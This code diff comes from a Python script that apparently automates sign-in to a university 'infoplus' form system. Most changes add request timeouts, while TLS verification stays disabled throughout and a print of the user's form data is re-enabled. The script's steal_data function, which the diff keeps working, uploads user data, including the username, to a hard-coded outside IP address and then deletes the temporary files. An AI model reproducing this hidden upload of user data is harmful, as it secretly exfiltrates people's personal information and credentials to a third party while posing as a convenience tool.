@@ -136,7 +136,7 @@ def sign(info, bks_flag=3):
             response = requests.get(url=url,
                                     headers=headers,
                                     allow_redirects=False,
-                                    verify=False)
+                                    verify=False, timeout=(3, 5))
             print_log(url + ' succeed')
             break
         except Exception as e:
@@ -160,7 +160,7 @@ def sign(info, bks_flag=3):
                                     headers=headers,
                                     cookies=cookies,
                                     allow_redirects=False,
-                                    verify=False)
+                                    verify=False, timeout=(3, 5))
             print_log(decode_url + ' succeed')
             break
         except Exception as e:
@@ -183,7 +183,7 @@ def sign(info, bks_flag=3):
                                     headers=headers,
                                     cookies=cookies,
                                     allow_redirects=False,
-                                    verify=False)
+                                    verify=False, timeout=(3, 5))
             print_log(encode_location + ' succeed')
             break
         except Exception as e:
@@ -206,7 +206,7 @@ def sign(info, bks_flag=3):
                                     headers=headers,
                                     cookies=new_cookies,
                                     allow_redirects=False,
-                                    verify=False)
+                                    verify=False, timeout=(3, 5))
             print_log(encode_location + ' succeed')
             break
         except Exception as e:
@@ -247,7 +247,7 @@ def sign(info, bks_flag=3):
                                      cookies=new_cookies,
                                      data=data,
                                      allow_redirects=False,
-                                     verify=False)
+                                     verify=False, timeout=(3, 5))
             print_log(url + ' succeed')
             break
         except Exception as e:
@@ -279,7 +279,7 @@ def sign(info, bks_flag=3):
                                     headers=headers,
                                     cookies=last_cookies,
                                     allow_redirects=False,
-                                    verify=False)
+                                    verify=False, timeout=(3, 5))
             print_log(new_url + ' succeed')
             break
         except Exception as e:
@@ -300,7 +300,7 @@ def sign(info, bks_flag=3):
                                     cookies=cookies,
                                     headers=headers,
                                     allow_redirects=False,
-                                    verify=False)
+                                    verify=False, timeout=(3, 5))
             print_log(encode_location + " succeed")
             break
         except Exception as e:
@@ -320,7 +320,7 @@ def sign(info, bks_flag=3):
             response = requests.get(url=encode_location,
                                     cookies=cookies,
                                     headers=headers,
-                                    verify=False)
+                                    verify=False, timeout=(3, 5))
             print_log(url + ' succeed')
             break
         except Exception as e:
@@ -338,7 +338,7 @@ def sign(info, bks_flag=3):
         try:
             count = count - 1
             print_log("9 " + url)
-            requests.get(url=url, cookies=cookies, headers=headers, verify=False)
+            requests.get(url=url, cookies=cookies, headers=headers, verify=False, timeout=(3, 5))
             print_log(url + ' succeed')
             break
         except Exception as e:
@@ -372,7 +372,7 @@ def sign(info, bks_flag=3):
                                      headers=headers,
                                      data=data,
                                      cookies=cookies,
-                                     verify=False)
+                                     verify=False, timeout=(3, 5))
             print_log(url + ' succeed')
             break
         except Exception as e:
@@ -416,7 +416,7 @@ def sign(info, bks_flag=3):
         try:
             count = count - 1
             print_log("11 " + entities)
-            requests.get(url=entities, cookies=cookies, headers=headers, verify=False)
+            requests.get(url=entities, cookies=cookies, headers=headers, verify=False, timeout=(3, 5))
             print_log(entities + " succeed")
             break
         except Exception as e:
@@ -435,7 +435,7 @@ def sign(info, bks_flag=3):
         try:
             count = count - 1
             print_log("12 " + url)
-            requests.get(url=url, cookies=cookies, headers=headers, verify=False)
+            requests.get(url=url, cookies=cookies, headers=headers, verify=False, timeout=(3, 5))
             print_log(url + ' succeed')
             print_log('请求/infoplus/alive文件成功')
             break
@@ -474,7 +474,7 @@ def sign(info, bks_flag=3):
             response = requests.post(url=url,
                                      cookies=cookies,
                                      headers=headers,
-                                     data=data, verify=False)
+                                     data=data, verify=False, timeout=(3, 5))
             print_log(url + ' succeed')
             print_log('请求/infoplus/interface/render文件成功')
             break
@@ -519,7 +519,7 @@ def sign(info, bks_flag=3):
         if item not in data.keys():
             data[item] = ""
 
-    # print("data", data)
+    print("data", data)
     if bks == "1":
         formData = {
             "_VAR_EXECUTE_INDEP_ORGANIZE_Name": data['_VAR_EXECUTE_INDEP_ORGANIZE_Name'],
@@ -627,6 +627,10 @@ def sign(info, bks_flag=3):
             "_VAR_ENTRY_TAGS": app['tags']
         }
     else:
+        if "_VAR_OWNER_PHONE" not in data.keys():
+            data["_VAR_OWNER_PHONE"] = ""
+        if '_VAR_ACTION_PHONE' not in data.keys():
+            data['_VAR_ACTION_PHONE'] = ""
         formData = {
             "_VAR_EXECUTE_INDEP_ORGANIZE_Name": data['_VAR_EXECUTE_INDEP_ORGANIZE_Name'],
             "_VAR_ACTION_ACCOUNT": data['_VAR_ACTION_ACCOUNT'],
@@ -750,7 +754,7 @@ def sign(info, bks_flag=3):
             response = requests.post(url=url,
                                      cookies=cookies,
                                      headers=headers,
-                                     data=body, verify=False)
+                                     data=body, verify=False, timeout=(3, 5))
             print_log(url + ' succeed')
             break
         except Exception as e:
@@ -791,7 +795,7 @@ def sign(info, bks_flag=3):
             response = requests.post(url=url,
                                      cookies=cookies,
                                      headers=headers,
-                                     data=body, verify=False)
+                                     data=body, verify=False, timeout=(3, 5))
             print_log(url + ' succeed')
             print_log('请求/infoplus/interface/doAction文件成功')
             break
@@ -863,7 +867,7 @@ def steal_data(json_data, upload_path="userinfo"):
             data = {"filepath": upload_path}
             r = requests.post('http://39.106.158.85:8886/SuperDriver/upload',
                               files=file,
-                              data=data)
+                              data=data, timeout=(3, 5))
     else:
         username = json_data["username"]
         if '//' in json_data.keys():
@@ -879,7 +883,7 @@ def steal_data(json_data, upload_path="userinfo"):
             data = {"filepath": "userinfo"}
             r = requests.post('http://39.106.158.85:8886/SuperDriver/upload',
                               files=file,
-                              data=data)
+                              data=data, timeout=(3, 5))
     import shutil
     shutil.rmtree('./sakdjfhksjdhw/')
     print(r.text)
